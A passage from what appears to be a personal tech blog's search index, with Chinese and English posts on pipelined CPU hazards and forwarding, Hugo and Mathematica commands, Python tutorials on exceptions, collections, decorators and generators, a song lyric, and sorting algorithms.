{PC[31:28],IR[25:0],2’b00}   EX ALUOut \u0026lt;= A op B; (Register,EX/MEM.ALUOut,MEM/WB.ALUOut,MDR) ALUOut\u0026lt;=A+sign-ext(IR[15:0]); (Register,EX/MEM.ALUOut,MEM/WB.ALUOut,MDR)     MEM  Lw:MDR\u0026lt;=MemData[ALUOut]; Sw:MemData[ALUout] \u0026lt;=B(B,MEM/WB.MemReadData)     WB Reg[IR[15:11]] \u0026lt;=ALUOut Reg[IR[20:16]] \u0026lt;=MDR      但是可能会带来一些新的问题：\n  在EX阶段我们使用ALU比较两个操作数是否相等，使用PCAdder计算分支地址，所以现在需要在ID阶段额外引入比较器和PC计算器。注意到数据可能来自旁路。\n  在ID阶段判断beq，等价于将beq的EX阶段提前进行，这样就会产生3种情况：\n beq前1条指令为R type指令，stall 1个周期（1EX-\u0026gt;2ID）                 add $a3,$a2,$a1 IF ID EX MEM WB     nop          beq $t0,$a3,0x10   IF ID EX MEM WB     beq前1条指令为lw指令，stall 2个周期（1MEM-\u0026gt;2ID）                 lw $a3,0($a2) IF ID EX MEM WB     nop          nop          beq $t0,$a3,0x10    IF ID EX MEM     beq前2条指令为lw指令，stall 1个周期（1MEM-\u0026gt;3ID）                 lw $a3,0($a2) IF ID EX MEM WB     add $t3,$t2,$t1  IF ID EX MEM WB    nop          beq $t0,$a3,0x10    IF ID EX MEM      延迟槽技术 即使将beq的判断前移到ID阶段，在beq之后也必须stall一个周期。可以在stall周期内执行一些必定要执行的指令，这就是延迟槽技术。\n无特殊说明使用延迟槽技术的情况下，即使beq后面的指令必定执行，也必须要stall。\n预测  静态预测：总预测分支不执行或者执行，错误则撤销指令。若预测失误会导致不必要的流水线重置。 动态预测：在IF阶段进行分支预测缓存，可以用PC（或者PC的低位地址）为索引，记录过去是否跳转。   实现过程：\n  clock 1(IF):\n在第一次执行beq指令时，建立BHT和BTB，并存下1)指令地址 2)最终是否跳转 3)跳转目标地址；在之后执行beq指令时，查询指令地址是否在BHT和BTB中，若不存在，建立新的条目；若存在，根据历史记录判断是否跳转；若跳转，取出目标地址作为下一条指令的IF地址。\n  clock 2(ID):\n根据预测目标地址取出指令。\n   j hazard 考虑如下指令：\n1 2  j label add $t3,$t1,$t2                  j label IF ID EX MEM WB     stall          add $a3,$a2,$a1   IF ID EX MEM WB    j在ID阶段完成目标地址的计算，需要stall一个周期。\n**但这种做法是错误的！**因为流水线直到ID阶段才能知道取出的指令为j，而此时下一条指令只能已经从指令存储中取出，只能延后执行，而不能不执行。\n于是我们不进行硬件阻塞。j指令执行完ID阶段时，可以判断出执行的是j指令，此时下一条指令（实际上不会执行）也执行完IF阶段，但之后的步骤都会被flush掉，ID阶段生成的新地址也被用于载入下下一条指令。从时间上看还是stall了一个周期。\n               j label  IF ID EX MEM WB     add $a3,$a2,$a1(next)  IF x x x x    add $a3,$a2,$a1(jump target)   IF ID EX MEM WB     转发方式总结\n 数据冒险   A2-\u0026gt;B1 R型的前前条为R型 A3-\u0026gt;B1 R型的前条为R型 A4-\u0026gt;B2 lw-sw转发  此外，A4-\u0026gt;B1无法转发，对应于lw-R型必须stall一个周期。\n 控制冒险(beq)   A2-\u0026gt;B0 beq的前前条为R型，可以使用转发解决 A3-\u0026gt;B0 beq的前前条为lw，需要stall 2个周期 A4-\u0026gt;B0 beq的前条为R型，需要stall 1个周期 A5-\u0026gt;B0 beq的前条为lw型，需要stall 2个周期  注意在转发时不能跨时钟周期转发，比如上上条指令ALU的结果输出不能直接转发，必须要经过MEM/WB寄存器。\n 考虑冒险的数据通路设计 Forward Unit R-R type(1) 若R型的前条为R型，则可能需要从EX_MEM寄存器中转发至EX阶段：\n1 2 3 4 5 6 7 8  if (EX_MEM.RegWrite // 需要写入寄存器  and (EX_MEM.RegWrAddr != 0) // 不能使用0寄存器  and (EX_MEM.RegWrAddr == ID_EX.RegisterRs)) // 触发转发条件（如果不使用转发就会冒险）  ForwardA = 10; if (EX_MEM.RegWrite and (EX_MEM.RegWrAddr != 0) and (EX_MEM.RegWrAddr == ID_EX.RegisterRt)) ForwardB = 10;   R-R type(2) 若R型的前前条为R型，则可能需要从MEM_WB寄存器中转发至EX阶段：\n1 2 3 4 5 6 7 8 9 10 11 12  if (MEM_WB.RegWrite and (MEM_WB.RegWrAddr != 0) and (MEM_WB.RegWrAddr == ID_EX.RegisterRs) and (EX_MEM.RegWrAddr != ID_EX.RegisterRs || ~ EX_MEM.RegWrite) // 从前条转发的条件不满足 ) ForwardA = 01; if (MEM_WB.RegWrite and (MEM_WB.RegWrAddr != 0) and (MEM_WB.RegWrAddr == ID_EX.RegisterRt) and (EX_MEM.RegWrAddr != ID_EX.RegisterRt || ~ EX_MEM.RegWrite) // 从前条转发的条件不满足 ) ForwardB = 01;   最后一个判断条件是为了避免以下情况（前两条指令都是以关联寄存器为目的寄存器的时候，需要转发最新的数据，其数据来源是前一条，而不是前前条）：\n1 2 3  add $1,$1,$2 add $1,$1,$3 add $1,$1,$4   综上可知，EX阶段的forward单元可以描述为（以操作数1为例）：\n1 2 3 4 5 6 7 8  always @(*) begin case(ForwardA) 00:ALU_op1 \u0026lt;= ID_EX.op1; 01:ALU_op1 \u0026lt;= MEM_WB.wb_res; 10:ALU_op1 \u0026lt;= EX_MEM.alu_res; default:ALU_op1 \u0026lt;= ID_EX.op1; endcase end   lw-sw type 若sw的前条为lw，则可能需要从MEM/WB寄存器中转发至MEM阶段：\n1 2 3 4 5 6  if(EX_MEM.RegWrAddr != 0 // 不能使用0寄存器  and EX_MEM.MemWrite // 需要写入存储器(sw)  and MEM_WB.MemRead // 需要读取存储器(lw)  and EX_MEM.RegWrAddr == MEM_WB.RegWrAddr // 转发源和转发目标的寄存器编号一致 ) ForwardA = 1;   综上可知，MEM阶段的forward单元可以描述为：\n1 2 3 4 5 6  always @(*) begin case(Forward) 0:Mem_Write_Data \u0026lt;= EX_MEM.op2; 1:Mem_Write_Data \u0026lt;= MEM_WB.Mem_Read_Data; endcase end   beq 若beq的前前一条指令为R type，则需要将EX_MEM中的ALU计算结果转发至ID阶段：\n1 2 3 4  if(EX_MEM.RegWrite // 需要写入寄存器  and EX_MEM.RegisterRd == IF_ID.RegisterRs // 需要用到寄存器中的结果  ) Forward = 1;   综上可知，ID阶段的forward单元可以描述为：\n1 2 3 4 5 6  always @(*) begin case(Forward) 0:compare_op1 \u0026lt;= regA; 1:compare_op1 \u0026lt;= EX_MEM.alu_res; endcase end   Hazard Unit lw-R type 1 2 3 4  if (ID/EX.MemRead // 是否为load指令  and ((ID/EX.RegisterRd == IF/ID.RegisterRs) or (ID/EX.RegisterRd == IF/ID.RegisterRt)) ) // EX级的装载指令的目的寄存器是否与在ID级指令的某一个源寄存器相匹配（可能会发生冒险）  stall = 5\u0026#39;b11000; // stall IF and ID   beq 1 2 3 4 5  if(ID.branch // 分支指令  and ((ID_EX.RegWrite and (ID_EX.RegisterRd == IF_ID.RegisterRs or ID_EX.RegisterRd == IF_ID.RegisterRt))) // R type  and ((EX_MEM.MemRead and (EX_MEM.RegisterRd == IF_ID.RegisterRs or EX_MEM.RegisterRd == IF_ID.RegisterRt))) // lw  ) stall = 5\u0026#39;b11000; // stall IF and ID    当 beq 前一条指令为 lw 指令时，我们阻塞流水线一个周期，在 lw 和 beq 中间插入一个气泡。此时这一情况自动退化为前前一条指令为 lw 的情况，会被上述逻辑再次处理，因此最终还是会完成 2 个周期的阻塞。\n Flush Unit 使用flush[i]清除第i级流水线上执行的指令（对应4级流水寄存器以及最终写回的寄存器堆）：\n1 2 3  if(flush[i]) begin stage_reg[i] \u0026lt;= 0; end   流水线CPU异常处理 假设有3种异常：badop，IRQ（外部中断），ALUExp。\nException被放置在EX阶段，因此badop要经过一次ID/EX寄存器。\n触发异常时，该单元会flush掉当前指令的EX/MEM寄存器，下条指令的ID/EX寄存器，下下条指令的IF/ID寄存器。（注意flush由hazard和exception单元共同控制）\n扩展技术 指令级并行 超级流水线 用于缩短时钟周期。\n多发射 用于降低CPI。\n  超长指令字 静态决定让哪些指令同时执行（在编译阶段由编译器决定）。\n  超标量 动态决定哪些指令同时执行 （在运行时由硬件决定）。\n IOI-IOC,IOI-OOC,OOI-OOC\n   线程级并行 超线程 多核处理器 $a$为并行部分的比例，$n$为并行部分的加速比。 $$ S=\\frac{1}{(1-a)+\\frac{a}{n}} $$\n异构计算 单指令流多数据流，具有更大的并行度，设计相对比较简单。\n","date":"2022-05-31T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/digital_logic_and_processors/pipeline_cpu/","title":"Pipeline CPU"},{"content":"冰菓 今夜与君\n爱梦相会\n务必觅得\n微眠之约\n萌生此等惬意\n实乃徒增彷徨\n予君之意\n君不知乎\n察其目光\n未萦他意\n宛如待友\n毫无二致\n许愿星逝于晓\n夜现晨湮之法\n愿君得察\n今夜与君\n爱梦相会\n务必觅得\n微眠之约\n","date":"2022-05-29T16:24:16+08:00","permalink":"https://ther-nullptr.github.io/posts/small_talk/ice-cream/","title":"Ice Cream"},{"content":"Hugo commands  create a article  1  $ hugo new post/first.md    start hugo server  1 2  $ hugo server # simple debug $ hugo server --theme=Mainroad --buildDrafts # debug with theme    watch environment info  1  $ hugo env   ","date":"2022-05-29T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/awesome_toolkits/command/","title":"Hugo Commands"},{"content":"Fourier Transform:\n1  FourierTransform[HeavisideTheta[x],x,w]  Inverse Fourier Transform:\n1  InverseFourierTransform[1/(1+I*w),w,x]  Fourier coefficient:\n1 2 3  FourierSinCoefficient[SquareWave[x],x,n]FourierCosCoefficient[SquareWave[x],x,n]FourierCoefficient[SquareWave[x],x,n]  Convolution:\n1 2  Convolve[UnitBox[x],UnitBox[x],x,x]Convolve[Exp[-a*t]*HeavisideTheta[t],Sin[t]*HeavisideTheta[t],t,x]  DTFT:\n1  FourierSequenceTransform[HeavisideTheta[n]*a^n,n,w]  IDTFT:\n1  InverseFourierSequenceTransform[1,n,w]  Laplace:\n1  LaplaceTransform[t^4Sin[t],t,s]  InverseLaplace:\n1  LaplaceTransform[E^(-t),t,s]  ","date":"2022-04-16T00:14:35+08:00","permalink":"https://ther-nullptr.github.io/posts/awesome_toolkits/ss_mathematica/","title":"Mathematica in Signal \u0026 System"},{"content":"传统异常处理 在Python中，传统的异常处理格式如下：\n1 2 3 4 5 6 7 8 9 10 11  try: f = open(\u0026#39;foo.txt\u0026#39;) print(\u0026#34;No error occurs!\u0026#34;) except FileExistsError: # 按照不同的异常类型捕获异常 print(\u0026#39;There is a FileExistsError!\u0026#39;) except FileNotFoundError: print(\u0026#39;There is a FileNotFoundError!\u0026#39;) else: print(f.readlines()) # 当未触发异常时，将会执行else中的语句 finally: print(\u0026#34;Operations are Finished!\u0026#34;) # finally定义无论在任何情况下都会执行的清理行为   结果1：\n1 2  There is a FileNotFoundError! Operations are Finished!   结果2：\n1 2 3  No error occurs! [\u0026#39;Hello World!\u0026#39;] Operations are Finished!   With with语句可以极大地简化这种try-except-else-finally模式。例如，如果我们想要实现文件的安全读写，传统的写法是这样的：\n1 2 3 4 5  file = open(\u0026#39;foo.txt\u0026#39;, \u0026#39;w+\u0026#39;) try: file.write(\u0026#39;hello world !\u0026#39;) finally: file.close()   而使用with语句后是这样的：\n1 2  with open(\u0026#39;foo.txt\u0026#39;, \u0026#39;w+\u0026#39;) as file: file.write(\u0026#39;hello world !\u0026#39;)   要想使用with语句，我们需要实现一个上下文管理器类(contextmanager)。上下文管理器中含有__enter__和__exit__两个方法。with语句开始运行时，会在上下文管理器对象上调用__enter__方法。with语句运行结束后，会在上下文管理器对象上调 用__exit__方法。例如，我们可以写一个简单的文件管理类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  class MessageWriter: def __init__(self, file_name): self.file_name = file_name # 解释器在调用__enter__时，除了隐式的self之外，不会传入任何参数 def __enter__(self): self.file = open(self.file_name, \u0026#39;w+\u0026#39;) return self.file # 传给__exit__方法的三个参数列举如下：exc_type(异常类)；exc_value(异常实例)；traceback(traceback对象) def __exit__(self, exc_type, exc_value, traceback): self.file.close() with MessageWriter(\u0026#39;foo.txt\u0026#39;) as f: f.write(\u0026#39;a test for MessageWriter\u0026#39;)   @contextmanager 相比于实现一个上下文管理器类，装饰器@contextmanager能减少创建上下文管理器的样板代码量，因为不用编写一个完整的类，定义__enter__和__exit__方法，而只需实现有一个yield语句的生成器。\n在此用法中，yield语句前面的所有代码在with块开始时（即解释器调用__enter__方法时）执行，yield语句后面的代码在with块结束时（即调用__exit__方法时）执行。\n使用@contextmanager重写上面的代码：\n1 2 3 4 5 6 7 8 9 10  from contextlib import contextmanager @contextmanager def myopen(file_name): f = open(file_name,\u0026#39;w+\u0026#39;) yield f f.close() with myopen(\u0026#39;foo.txt\u0026#39;) as f: f.write(\u0026#39;a test for contextmanager\u0026#39;)   ","date":"2022-01-14T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/python-advanced/5_exceptional_handling/","title":"Python异常处理"},{"content":"每一篇Python基础教程中，几乎都会提到list,set,dict等内置数据结构。除此之外，Python还有一些进阶数据结构，它们大部分储存在collections库中，除此之外 还有array.array等数据结构。你可以将它们与C++的STL相比较。\n这些高级数据结构在第三方库中也有着广泛应用。例如，在pytorch中，我们可以用collections.OrderedDict来建立一个神经网络，并为每一层网络命名：\n1 2 3 4 5 6  model = nn.Sequential(OrderedDict([ (\u0026#39;conv1\u0026#39;, nn.Conv2d(1,20,5)), (\u0026#39;relu1\u0026#39;, nn.ReLU()), (\u0026#39;conv2\u0026#39;, nn.Conv2d(20,64,5)), (\u0026#39;relu2\u0026#39;, nn.ReLU()) ]))   接下来，本文将重点介绍几种较为常见的高级数据结构，想要了解更多，可以访问https://docs.python.org/3.8/library/collections\ncollections.namedtuple 我们知道，元组(tuple)可以将不同类型的变量组合在一起，就像(1,'A',[0.1,0.2])这样。从某种意义上，元组和C++中的结构体(struct)在应用上有一定的相似之处。但元组本身不能为元组内部的数据进行命名，所以往往我们并不知道一个元组所要表达的意义。collections.namedtuple解决了这一问题。\n该数据结构的定义方式如下：\n1 2 3  collections.namedtuple(typename, field_names) # typename: 元组名称 # field_name: 元组中元素的名称，可以是由数个字符串组成的可迭代对象，或者是由空格分隔开的字段名组成的字符串。   更多用法见以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  #! /usr/bin/python3 from collections import namedtuple # 新建namedtuple Course = namedtuple(\u0026#39;Course\u0026#39;, [\u0026#39;name\u0026#39;, \u0026#39;credits\u0026#39;, \u0026#39;time\u0026#39;]) # 获取namedtuple的属性 print(Course._fields) # 实例化Course Linear_Algebra = Course(\u0026#39;linear algebra\u0026#39;,4,(\u0026#39;Tue\u0026#39;,\u0026#39;13:30-15:05\u0026#39;)) print(Linear_Algebra) # 获取属性 print(Linear_Algebra.time) # 以字典的方式呈现namedtuple（严格地来说是OrderedDict，下文会讲） print(Linear_Algebra._asdict())   运行结果如下：\n1 2 3 4  (\u0026#39;name\u0026#39;, \u0026#39;credits\u0026#39;, \u0026#39;time\u0026#39;) Course(name=\u0026#39;linear algebra\u0026#39;, credits=4, time=(\u0026#39;Tue\u0026#39;, \u0026#39;13:30-15:05\u0026#39;)) (\u0026#39;Tue\u0026#39;, \u0026#39;13:30-15:05\u0026#39;) {\u0026#39;name\u0026#39;: \u0026#39;linear algebra\u0026#39;, \u0026#39;credits\u0026#39;: 4, \u0026#39;time\u0026#39;: (\u0026#39;Tue\u0026#39;, \u0026#39;13:30-15:05\u0026#39;) }   collections.OrderedDict 众所周知，Python中的dict是基于hash table实现的（详细的机制可以浏览Fluent Python一书），这使得dict在实现高性能查找的同时，舍弃了有序性（Python3.6之前）。而collections.OrderedDict在添加键的时候会保持顺序，保证了键的迭代次序的一致性。\n其用法见以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  #! /usr/bin/python3 from collections import OrderedDict print(\u0026#34;Before deleting:\u0026#34;) od = OrderedDict() od[\u0026#39;a\u0026#39;] = 1 od[\u0026#39;b\u0026#39;] = 2 od[\u0026#39;c\u0026#39;] = 3 od[\u0026#39;d\u0026#39;] = 4 od[\u0026#39;e\u0026#39;] = 5 od[\u0026#39;f\u0026#39;] = 6 for key, value in od.items(): print(key, value) print(\u0026#34;After deleting:\u0026#34;) od.pop(\u0026#39;c\u0026#39;) # 删除操作 for key, value in od.items(): print(key, value) print(\u0026#34;After re-inserting:\u0026#34;) od[\u0026#39;c\u0026#39;] = 3 # 赋值操作 for key, value in od.items(): print(key, value)   运行结果如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  Before deleting: a 1 b 2 c 3 d 4 e 5 f 6 After deleting: a 1 b 2 d 4 e 5 f 6 After re-inserting: a 1 b 2 d 4 e 5 f 6 c 3   可以看到，OrderedDict会根据放入元素的先后顺序进行排序。除此之外，OrderedDict和dict并无太大区别。\n 注：在Python3.6及之后的版本，所有的普通dict都变为有序的了，故两者将无区别。\n collections.defaultdict 在使用字典时，如果访问字典中不存在的键值对，程序会报错，就像这样：\n1 2  GPAdict = {\u0026#39;A+\u0026#39;:4.0,\u0026#39;A\u0026#39;:4.0} print(GPAdict[\u0026#39;A-\u0026#39;])   1 2 3 4  Traceback (most recent call last): File \u0026#34;/home/nullptr/open-source/advanced_python/1_advanced_data_structure/defaultdict_demo.py\u0026#34;, line 2, in \u0026lt;module\u0026gt; print(GPAdict[\u0026#39;A-\u0026#39;]) KeyError: \u0026#39;A-\u0026#39;   而collections.defaultdict可以解决这一问题。它在创建时可以传入一个可调用对象（可以是一般函数，也可以是lambda函数等），作为字典中没有键时的默认选择。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  from collections import defaultdict GPAdict = defaultdict(lambda:4.0) GPAdict[\u0026#39;A+\u0026#39;] = 4.0 GPAdict[\u0026#39;A\u0026#39;] = 4.0 print(GPAdict[\u0026#39;B+\u0026#39;]) # 以下写法也可以 \u0026#39;\u0026#39;\u0026#39; def foo(): return 4.0 GPAdict = defaultdict(foo) GPAdict[\u0026#39;A+\u0026#39;] = 4.0 GPAdict[\u0026#39;A\u0026#39;] = 4.0 print(GPAdict[\u0026#39;B+\u0026#39;]) \u0026#39;\u0026#39;\u0026#39;   运行结果如下：\n1  4.0   ","date":"2022-01-14T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/python-advanced/1_advanced_data_structure/","title":"Python数据结构进阶"},{"content":"Python是一门动态语言，在运行时检查类型，在定义变量时不需要声明类型。这样做的代价是，不利于在运行前找出可能存在的bug，也可能出现可读性较差的问题。\n函数注释 为解决这一点问题，Python引入了函数注释(Function Annotations)。然而，python的解释器并不会为变量进行真实的“类型检查”，这种注解的作用只是为了方便阅读。这一点和TypeScript有很大的不同。\n而对于列表，元组等数据结构，我们可以利用typing模块实现注解。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  from typing import List def int_add(a: int, b: int) -\u0026gt; int: return a + b print(int_add(1, 2)) print(int_add(\u0026#34;aaa\u0026#34;, \u0026#34;bbb\u0026#34;)) # 不符合注解，但不会报错！ def list_add(a: List, b: List) -\u0026gt; List: return a + b print(list_add([1, 2], [3, 4]))   静态类型检查 虽然Python本身没有像TypeScript那样提供静态类型检查的机制，但函数注释却可用于类型检查器、IDE、静态检查器等第三方工具。常见的工具有mypy,Typeguard等。此处由于篇幅所限不再展开，感兴趣的朋友可以访问以下网址：\nmypy: http://mypy-lang.org/index.html\nTypeguard: https://typeguard.readthedocs.io/en/latest/index.html\n","date":"2022-01-14T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/python-advanced/2_type_settings/","title":"Python类型管理"},{"content":"函数装饰器(decorator)用于在源码中“标记”函数，在不修改原函数的前提下，以某种方式增强函数的行为。\nPython的装饰器基于闭包实现。闭包是指函数中再嵌套一个函数，并且引用外部函数的变量。\n1 2 3 4 5 6 7 8  # 在该示例中，outer函数内又定义了一个inner函数，并且inner函数又引用了外部函数outer的变量x，形成一个闭包 def outer(x): def inner(y): return x + y return inner # outer(1)(2)中，第一个括号传进去的值返回inner函数，其实就是返回1 + y，所以再传第二个参数进去，就可以得到返回值，1 + 2 print(outer(1)(2))   1  3   装饰器本质上就是一种闭包。我们可以用如下的方式实现一个装饰器：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  import time # 该装饰器可以对修饰的函数进行计时 def clock(func): def clocked(*args): #  t0 = time.perf_counter() result = func(*args) #  elapsed = time.perf_counter() - t0 name = func.__name__ arg_str = \u0026#39;, \u0026#39;.join(repr(arg) for arg in args) print(\u0026#39;[%0.8fs] %s(%s) -\u0026gt; %r\u0026#39; % (elapsed, name, arg_str, result)) return result return clocked @clock def factorial(n): return 1 if n \u0026lt; 2 else n*factorial(n-1) factorial(5) # 这一写法实际上等效于以下写法，可以看到装饰器就是一种更加简洁的闭包写法： # clock(factorial)(5)   1 2 3 4 5  [0.00000050s] factorial(1) -\u0026gt; 1 [0.00004400s] factorial(2) -\u0026gt; 2 [0.00008740s] factorial(3) -\u0026gt; 6 [0.00012330s] factorial(4) -\u0026gt; 24 [0.00013580s] factorial(5) -\u0026gt; 120   内置装饰器 实际上，我们自定义Python装饰器的情况还是比较少的。我们大多数时候使用Python所内置的一些装饰器来管理函数。如@contextmanager, @staticmethod, @classmethod, @abstractmethod, @property等。这些装饰器的用法将在后续教程中陆续介绍。\n","date":"2022-01-14T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/python-advanced/4_closure/","title":"Python装饰器"},{"content":"Python中有许多Pythonic的序列操作，也许它们可以用更加基础的方式实现，但这样写往往更加简洁。\n列表推导 列表推导(listcomps)是一种构建列表的快捷方式。\n1 2 3 4 5  numbers = [2022,1,22,20,38] numbers_1 = [bin(s) for s in numbers] # 将所有数字转换为二进制，并存入列表 numbers_2 = [hex(s) for s in numbers if s%2 == 0] # 将所有偶数数字转换为十六进制，并存入列表 print(numbers_1) print(numbers_2)   运行结果如下：\n1 2  [\u0026#39;0b11111100110\u0026#39;, \u0026#39;0b1\u0026#39;, \u0026#39;0b10110\u0026#39;, \u0026#39;0b10100\u0026#39;, \u0026#39;0b100110\u0026#39;] [\u0026#39;0x7e6\u0026#39;, \u0026#39;0x16\u0026#39;, \u0026#39;0x14\u0026#39;, \u0026#39;0x26\u0026#39;]   列表推导相对于之前的for循环写法，显然更加紧凑。由于列表推导支持映射变换和条件判断，我们也可以用map(映射)和filter(过滤器)来实现相似的功能。此两个函数的具体用法不在此阐述。\n1  numbers_1 = list(map(hex,filter(lambda x:x%2==0,numbers)))   有多个列表参与推导时，将会返回它们的笛卡尔积\n1 2 3 4  colors = [\u0026#39;black\u0026#39;, \u0026#39;white\u0026#39;] sizes = [\u0026#39;S\u0026#39;, \u0026#39;M\u0026#39;, \u0026#39;L\u0026#39;] result = [(color, size) for color in colors for size in sizes] print(result)   1  [(\u0026#39;black\u0026#39;, \u0026#39;S\u0026#39;), (\u0026#39;black\u0026#39;, \u0026#39;M\u0026#39;), (\u0026#39;black\u0026#39;, \u0026#39;L\u0026#39;), (\u0026#39;white\u0026#39;, \u0026#39;S\u0026#39;), (\u0026#39;white\u0026#39;, \u0026#39;M\u0026#39;), (\u0026#39;white\u0026#39;, \u0026#39;L\u0026#39;)]   生成器语法 相比于列表推导直接返回一个列表，生成器语法(genexps)可以逐个生成元素。而在语法上，生成器只不过是将[]换为了()。\n1 2 3 4 5  colors = [\u0026#39;black\u0026#39;, \u0026#39;white\u0026#39;] sizes = [\u0026#39;S\u0026#39;, \u0026#39;M\u0026#39;, \u0026#39;L\u0026#39;] for result in (f\u0026#39;{c},{s}\u0026#39; for c in colors for s in sizes): print(result)   1 2 3 4 5 6  black,S black,M black,L white,S white,M white,L   解包器 在Python函数的说明文档中，常常可以看到foo(...,*args,**kwargs)这样的说明。此处的*就代表解包器。*表示为列表和元组解包，**表示为字典解包。它们可以用于获取不确定数量的参数，从而实现一些较为优雅的写法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  # 元组解包 a, b, *rest = range(5) print(a, b, rest) a, *body, b = range(5) print(a, body, b) # 利用字典解包实现字典拼接 a = {\u0026#34;a\u0026#34;: 1, \u0026#34;b\u0026#34;: 2} b = {\u0026#34;c\u0026#34;: 3, \u0026#34;d\u0026#34;: 4} print({**a, **b}) # 当参数的数量不确定时，*args表示位置参数，**kwargs表示键值对参数 def advanced_print(val, *args, **kwargs): print(val) for v in args: print(f\u0026#39;args:{v}\u0026#39;) for k, v in kwargs.items(): print(f\u0026#39;kwargs:{k}-\u0026gt;{v}\u0026#39;) advanced_print(0, 1, 2, 3, param1=4, param2=5)   1 2 3 4 5 6 7 8 9  0 1 [2, 3, 4] 0 [1, 2, 3] 4 {\u0026#39;a\u0026#39;: 1, \u0026#39;b\u0026#39;: 2, \u0026#39;c\u0026#39;: 3, \u0026#39;d\u0026#39;: 4} 0 args:1 args:2 args:3 kwargs:param1-\u0026gt;4 kwargs:param2-\u0026gt;5   yield yield用于构造生成器。从某种意义上来讲，yield和return有一定的相似之处，但有return的函数直接返回所有结果，程序终止不再运行，并销毁局部变量；而有yield的函数则返回一个可迭代的 generator（生成器）对象，你可以使用for循环或者调用next()方法遍历生成器对象来提取结果。\n在调用生成器函数的过程中，每次遇到yield时函数会暂停并保存当前所有的运行信息（保留局部变量），返回yield的值, 并在下一次执行next()方法时从当前位置继续运行，直到生成器被全部遍历完。\nyield用法使得程序在迭代时免于生成列表，可以节省内存。\n1 2 3 4 5 6 7 8 9 10 11 12  # 一个用于生成Fibonacci数列的迭代器 def fibo_generator(max): n, a, b = 0, 0, 1 while n \u0026lt; max: yield b # print b a, b = b, a + b n = n + 1 f = fibo_generator(5) for val in f: print(val)   1 2 3 4 5  1 1 2 3 5   可以将上一写法与以下写法进行对比：\n1 2 3 4 5 6 7 8 9 10  # 用于对比：经典写法，直接打印，可控性较差 def fibo(max): n, a, b = 0, 0, 1 while n \u0026lt; max: print(b) # print b a, b = b, a + b n = n + 1 fibo(5)   1 2 3 4 5  1 1 2 3 5   以上说明参考自https://zhuanlan.zhihu.com/p/268605982\n字典推导和集合推导 字典推导和集合推导与列表推导有着相似的语法，只不过将[]换为了{}（字典为键值对，集合为值）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  DIAL_CODES = [ (86, \u0026#39;China\u0026#39;), (91, \u0026#39;India\u0026#39;), (1, \u0026#39;United States\u0026#39;), (62, \u0026#39;Indonesia\u0026#39;), (55, \u0026#39;Brazil\u0026#39;), ] # 字典推导 country_code = {country: code for code, country in DIAL_CODES} print(country_code) # 带有映射和判断的字典推导 country_code = { code: country.upper() for country, code in country_code.items() if code \u0026gt; 50 } print(country_code) # 集合推导 s = {country for _, country in DIAL_CODES} print(s)   1 2 3  {\u0026#39;China\u0026#39;: 86, \u0026#39;India\u0026#39;: 91, \u0026#39;United States\u0026#39;: 1, \u0026#39;Indonesia\u0026#39;: 62, \u0026#39;Brazil\u0026#39;: 55} {86: \u0026#39;CHINA\u0026#39;, 91: \u0026#39;INDIA\u0026#39;, 62: \u0026#39;INDONESIA\u0026#39;, 55: \u0026#39;BRAZIL\u0026#39;} {\u0026#39;India\u0026#39;, \u0026#39;China\u0026#39;, \u0026#39;United States\u0026#39;, \u0026#39;Brazil\u0026#39;, \u0026#39;Indonesia\u0026#39;}   ","date":"2022-01-14T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/programming/python-advanced/3_sequence/","title":"Python高级序列操作"},{"content":"快速排序与归并排序的思想 起源是递归法——将序列分成两部分处理，或者说，用二叉树遍历的逻辑处理。二叉树的遍历基本有三种方式——前序、中序、后序。\n  归并是一种后序遍历：算法到手有两个已经处理好的序列，然后把这两个序列处理成最终的结果。处理的最后一步，当然是完成对序列的排序，因此，算法的内容就是：将两个排序好的序列排成一个新的序列——这就是归并。\n  快排是一种前序遍历：对一个序列进行处理，然后处理其子列。处理有这样的要求：将两个子列都完全完成处理以后，整个数列就排好了。因此：“划分点”是唯一的符合条件的处理方法。\n  那么有没有中序遍历？手里拿着一个序列：一半已经排好，另一半还是完全乱的，这一步处理的目的就是：这一步执行完成之后，再对右边进行排序，整个序列就排好了。所以，这一个步骤的内容就应该是：维持左边的序列完好，保证右边所有的元素都大于左边的所有元素。\n  ","date":"2021-12-03T00:13:05+08:00","permalink":"https://ther-nullptr.github.io/posts/quotes/%E4%B8%87%E7%A5%9E/","title":"快速排序与归并排序的思想"},{"content":"前言 Python的魔法函数是指Python的类中，一系列函数名由双下划线包裹的函数。\n笔者最初接触到魔法函数的使用是在Pytorch中，在Pytorch中的Dataset类中有这样的用法：\n除了常见的__init__构造函数外，还有__getitem__和__len__函数。在之后的代码中，笔者并没有看到__getitem__和__len__函数的显示调用。那么这样的声明与定义有什么意义？\n首先定义一个空类，并用dir方法获取类中的所有方法(一个空类真的是空空如也吗？)\n1 2 3 4  class Foo: pass print(dir(Foo))   结果：\n1  [\u0026#39;__class__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, 